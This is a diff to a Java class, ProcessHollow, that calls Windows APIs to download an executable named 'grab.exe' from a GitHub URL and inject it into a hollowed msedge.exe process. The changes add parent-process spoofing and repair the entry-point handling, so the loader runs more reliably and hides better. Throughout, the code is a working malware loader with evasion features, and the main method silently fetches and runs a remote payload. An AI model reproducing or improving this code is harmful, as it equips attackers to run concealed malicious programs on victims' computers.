@@ -21,6 +21,12 @@ public class ProcessHollow {
     static MethodHandle lookupPrivilegeValue;
     static MethodHandle adjustTokenPrivileges;
     static MethodHandle getCurrentProcess;
+    static MethodHandle openProcess;
+    static MethodHandle terminateProcess;
+    static MethodHandle getLastError;
+    static MethodHandle initializeProcThreadAttributeList;
+    static MethodHandle updateProcThreadAttribute;
+    static MethodHandle deleteProcThreadAttributeList;
 
     static {
         try {
@@ -97,16 +103,60 @@ public class ProcessHollow {
                 kernel32.find("CloseHandle").orElseThrow(),
                 FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
 
+            openProcess = linker.downcallHandle(
+                kernel32.find("OpenProcess").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.ADDRESS,
+                    ValueLayout.JAVA_INT, ValueLayout.JAVA_BOOLEAN, ValueLayout.JAVA_INT));
+
+            terminateProcess = linker.downcallHandle(
+                kernel32.find("TerminateProcess").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.JAVA_INT));
+
+            getLastError = linker.downcallHandle(
+                kernel32.find("GetLastError").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT));
+
+            initializeProcThreadAttributeList = linker.downcallHandle(
+                kernel32.find("InitializeProcThreadAttributeList").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.JAVA_INT, ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
+
+            updateProcThreadAttribute = linker.downcallHandle(
+                kernel32.find("UpdateProcThreadAttribute").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.JAVA_INT, ValueLayout.JAVA_LONG,
+                    ValueLayout.ADDRESS, ValueLayout.JAVA_LONG, ValueLayout.ADDRESS, ValueLayout.ADDRESS));
+
+            deleteProcThreadAttributeList = linker.downcallHandle(
+                kernel32.find("DeleteProcThreadAttributeList").orElseThrow(),
+                FunctionDescriptor.ofVoid(ValueLayout.ADDRESS));
+
         } catch (Throwable t) {
             throw new RuntimeException(t);
         }
     }
 
-    public static void Load(byte[] buffer, String host) throws Throwable {
+    static int lastError() {
+        try { return (int) getLastError.invokeExact(); } catch (Throwable t) { return -1; }
+    }
+
+    public static void Load(byte[] buffer, String host, int spoofPid) throws Throwable {
+        MemorySegment hProcess = MemorySegment.NULL;
+        MemorySegment hThread  = MemorySegment.NULL;
+        MemorySegment hParent  = MemorySegment.NULL;
+        MemorySegment attrList = MemorySegment.NULL;
+        boolean resumed = false;
+        boolean created = false;
+        int childPid = 0;
+
         try (Arena arena = Arena.ofConfined()) {
             ByteBuffer bb = ByteBuffer.wrap(buffer).order(ByteOrder.LITTLE_ENDIAN);
+            if (bb.getShort(0) != 0x5A4D) return;
 
-            int   e_lfanew         = bb.getInt(0x3C);
+            int e_lfanew = bb.getInt(0x3C);
+            if (bb.getInt(e_lfanew) != 0x00004550) return;
+
             int   sizeOfImage      = bb.getInt(e_lfanew + 0x18 + 0x38);
             int   sizeOfHeaders    = bb.getInt(e_lfanew + 0x18 + 0x3C);
             int   entryPoint       = bb.getInt(e_lfanew + 0x18 + 0x10);
@@ -114,37 +164,72 @@ public class ProcessHollow {
             short sizeOfOptHdr     = bb.getShort(e_lfanew + 0x4 + 0x10);
             long  imageBase        = bb.getLong(e_lfanew + 0x18 + 0x18);
 
-            MemorySegment si = arena.allocate(0x68);
-            si.set(ValueLayout.JAVA_INT, 0, 0x68);
+            if (spoofPid > 0) {
+                hParent = (MemorySegment) openProcess.invokeExact(0x0080, false, spoofPid);
+            }
+
+            MemorySegment si = arena.allocate(0x78);
+            si.set(ValueLayout.JAVA_INT, 0, 0x78);
             MemorySegment pi = arena.allocate(0x18);
 
-            byte[] cmdBytes = (host + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+            int creationFlags = 0x00000004 | 0x08000000;
+
+            if (hParent.address() != 0) {
+                MemorySegment sizeSeg = arena.allocate(8);
+                int _r = (int) initializeProcThreadAttributeList.invokeExact(
+                    MemorySegment.NULL, 1, 0, sizeSeg);
+
+                long attrSize = sizeSeg.get(ValueLayout.JAVA_LONG, 0);
+                attrList = arena.allocate(attrSize);
+
+                int okInit = (int) initializeProcThreadAttributeList.invokeExact(attrList, 1, 0, sizeSeg);
+                if (okInit != 0) {
+                    MemorySegment parentPtr = arena.allocate(8);
+                    parentPtr.set(ValueLayout.JAVA_LONG, 0, hParent.address());
+                    int okUpd = (int) updateProcThreadAttribute.invokeExact(
+                        attrList, 0, 0x00020000L,
+                        parentPtr, 8L, MemorySegment.NULL, MemorySegment.NULL);
+
+                    if (okUpd != 0) {
+                        si.set(ValueLayout.ADDRESS, 0x70, attrList);
+                        creationFlags |= 0x00080000;
+                    }
+                }
+            }
+
+            String cmdLine = "\"" + host + "\"\0";
+            byte[] cmdBytes = cmdLine.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
             MemorySegment cmdSeg = arena.allocate(cmdBytes.length);
             cmdSeg.copyFrom(MemorySegment.ofArray(cmdBytes));
 
             int ok = (int) createProcess.invokeExact(
                 MemorySegment.NULL, cmdSeg,
                 MemorySegment.NULL, MemorySegment.NULL,
-                false, 0x00000004 | 0x08000000,
+                false, creationFlags,
                 MemorySegment.NULL, MemorySegment.NULL,
                 si, pi);
 
             if (ok == 0) return;
+            created = true;
 
-            MemorySegment hProcess = MemorySegment.ofAddress(pi.get(ValueLayout.JAVA_LONG, 0x0));
-            MemorySegment hThread  = MemorySegment.ofAddress(pi.get(ValueLayout.JAVA_LONG, 0x8));
+            hProcess = MemorySegment.ofAddress(pi.get(ValueLayout.JAVA_LONG, 0x0));
+            hThread  = MemorySegment.ofAddress(pi.get(ValueLayout.JAVA_LONG, 0x8));
+            childPid = pi.get(ValueLayout.JAVA_INT, 0x10);
 
             int unmap = (int) zwUnmapViewOfSection.invokeExact(hProcess, MemorySegment.ofAddress(imageBase));
 
             MemorySegment remote = (MemorySegment) virtualAllocEx.invokeExact(
                 hProcess, MemorySegment.ofAddress(imageBase),
                 (long) sizeOfImage, 0x3000, 0x04);
-            if (remote.address() == 0) return;
+            if (remote.address() == 0) throw new RuntimeException("VirtualAllocEx falhou");
+
+            long actualBase = remote.address();
 
             MemorySegment hdrSeg = arena.allocate(sizeOfHeaders);
             hdrSeg.copyFrom(MemorySegment.ofArray(Arrays.copyOf(buffer, sizeOfHeaders)));
-            int w1 = (int) writeProcessMemory.invokeExact(hProcess, MemorySegment.ofAddress(imageBase),
+            int w1 = (int) writeProcessMemory.invokeExact(hProcess, MemorySegment.ofAddress(actualBase),
                 hdrSeg, (long) sizeOfHeaders, MemorySegment.NULL);
+            if (w1 == 0) throw new RuntimeException("Falha headers");
 
             for (short i = 0; i < numberOfSections; i++) {
                 int secOff         = e_lfanew + (0x18 + sizeOfOptHdr) + (0x28 * i);
@@ -152,28 +237,32 @@ public class ProcessHollow {
                 int sizeOfRawData  = bb.getInt(secOff + 0x10);
                 int ptrToRawData   = bb.getInt(secOff + 0x14);
                 if (sizeOfRawData <= 0 || ptrToRawData + sizeOfRawData > buffer.length) continue;
+
                 byte[] sec = Arrays.copyOfRange(buffer, ptrToRawData, ptrToRawData + sizeOfRawData);
                 MemorySegment secSeg = arena.allocate(sec.length);
                 secSeg.copyFrom(MemorySegment.ofArray(sec));
                 int ws = (int) writeProcessMemory.invokeExact(hProcess,
-                    MemorySegment.ofAddress(imageBase + virtualAddress),
+                    MemorySegment.ofAddress(actualBase + virtualAddress),
                     secSeg, (long) sec.length, MemorySegment.NULL);
+                if (ws == 0) throw new RuntimeException("Falha secao " + i);
             }
 
             MemorySegment ctx = arena.allocate(0x4d0);
             ctx.set(ValueLayout.JAVA_INT, 0x30, 0x0010001B);
             int gtc = (int) getThreadContext.invokeExact(hThread, ctx);
-            long rdx = ctx.get(ValueLayout.JAVA_LONG, 0x88);
+            if (gtc == 0) throw new RuntimeException("GetThreadContext falhou");
 
+            long rdx = ctx.get(ValueLayout.JAVA_LONG, 0x88);
             if (rdx != 0) {
                 MemorySegment ibSeg = arena.allocate(8);
-                ibSeg.set(ValueLayout.JAVA_LONG, 0, imageBase);
+                ibSeg.set(ValueLayout.JAVA_LONG, 0, actualBase);
                 int wpeb = (int) writeProcessMemory.invokeExact(hProcess,
                     MemorySegment.ofAddress(rdx + 16), ibSeg, 8L, MemorySegment.NULL);
             }
 
-            ctx.set(ValueLayout.JAVA_LONG, 0x80, imageBase + entryPoint);
+            ctx.set(ValueLayout.JAVA_LONG, 0xF8, actualBase + entryPoint);
             int stc = (int) setThreadContext.invokeExact(hThread, ctx);
+            if (stc == 0) throw new RuntimeException("SetThreadContext falhou");
 
             MemorySegment oldProt = arena.allocate(ValueLayout.JAVA_INT);
             for (short i = 0; i < numberOfSections; i++) {
@@ -184,27 +273,32 @@ public class ProcessHollow {
                 int prot = 0x02;
                 if ((characteristics & 0x20000000) != 0)      prot = 0x20;
                 else if ((characteristics & 0x80000000) != 0) prot = 0x04;
-                try {
-                    int vp = (int) virtualProtectEx.invokeExact(hProcess,
-                        MemorySegment.ofAddress(imageBase + virtualAddress),
-                        (long) virtualSize, prot, oldProt);
-                } catch (Throwable ignored) {}
-            }
-
-            if (rdx != 0) {
-                try {
-                    MemorySegment origBase = arena.allocate(8);
-                    origBase.set(ValueLayout.JAVA_LONG, 0, 0x140000000L);
-                    int spoof = (int) writeProcessMemory.invokeExact(hProcess,
-                        MemorySegment.ofAddress(rdx + 16), origBase, 8L, MemorySegment.NULL);
-                } catch (Throwable ignored) {}
+                int vp = (int) virtualProtectEx.invokeExact(hProcess,
+                    MemorySegment.ofAddress(actualBase + virtualAddress),
+                    (long) virtualSize, prot, oldProt);
             }
 
             int rt = (int) resumeThread.invokeExact(hThread);
+            if (rt == 0xFFFFFFFF) throw new RuntimeException("ResumeThread falhou");
+            resumed = true;
 
-            System.out.println("Ready..");
             Thread.sleep(2000);
-            System.exit(0);
+        } finally {
+            if (created && !resumed && hProcess.address() != 0) {
+                int tp = (int) terminateProcess.invokeExact(hProcess, 1);
+            }
+            if (hThread.address() != 0) {
+                int r = (int) closeHandle.invokeExact(hThread);
+            }
+            if (hProcess.address() != 0) {
+                int r = (int) closeHandle.invokeExact(hProcess);
+            }
+            if (hParent.address() != 0) {
+                int r = (int) closeHandle.invokeExact(hParent);
+            }
+            if (attrList.address() != 0) {
+                deleteProcThreadAttributeList.invokeExact(attrList);
+            }
         }
     }
 
@@ -213,10 +307,12 @@ public class ProcessHollow {
             enableDebugPrivilege();
 
             String url  = "https://github.com/vitor6543vitor-arch/dada/raw/refs/heads/main/grab.exe";
-            String file = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+            String host = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+
+            int spoofPid = 0;
 
             byte[] payload = downloadFile(url);
-            Load(payload, file);
+            Load(payload, host, spoofPid);
         } catch (Throwable t) {
         }
     }
@@ -226,19 +322,22 @@ public class ProcessHollow {
             MemorySegment hToken = arena.allocate(ValueLayout.ADDRESS);
             MemorySegment hProc  = (MemorySegment) getCurrentProcess.invokeExact();
             if ((int) openProcessToken.invokeExact(hProc, 0x0028, hToken) == 0) return;
+
             MemorySegment tok = hToken.get(ValueLayout.ADDRESS, 0);
             byte[] nameB = ("SeDebugPrivilege\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
             MemorySegment nameSeg = arena.allocate(nameB.length);
             nameSeg.copyFrom(MemorySegment.ofArray(nameB));
+
             MemorySegment luid = arena.allocate(8);
             if ((int) lookupPrivilegeValue.invokeExact(MemorySegment.NULL, nameSeg, luid) != 0) {
                 MemorySegment tp = arena.allocate(16);
                 tp.set(ValueLayout.JAVA_INT,  0,  1);
-                tp.set(ValueLayout.JAVA_LONG, 4,  luid.get(ValueLayout.JAVA_LONG, 0));
-                tp.set(ValueLayout.JAVA_INT,  12, 0x00000002);
+                tp.set(ValueLayout.JAVA_INT,  4,  luid.get(ValueLayout.JAVA_INT, 0));
+                tp.set(ValueLayout.JAVA_INT,  8,  luid.get(ValueLayout.JAVA_INT, 4));
+                tp.set(ValueLayout.JAVA_INT, 12, 0x00000002);
                 int adj = (int) adjustTokenPrivileges.invokeExact(tok, 0, tp, 0, MemorySegment.NULL, MemorySegment.NULL);
             }
-            int ch = (int) closeHandle.invokeExact(tok);
+            int r = (int) closeHandle.invokeExact(tok);
         } catch (Throwable ignored) {}
     }
 
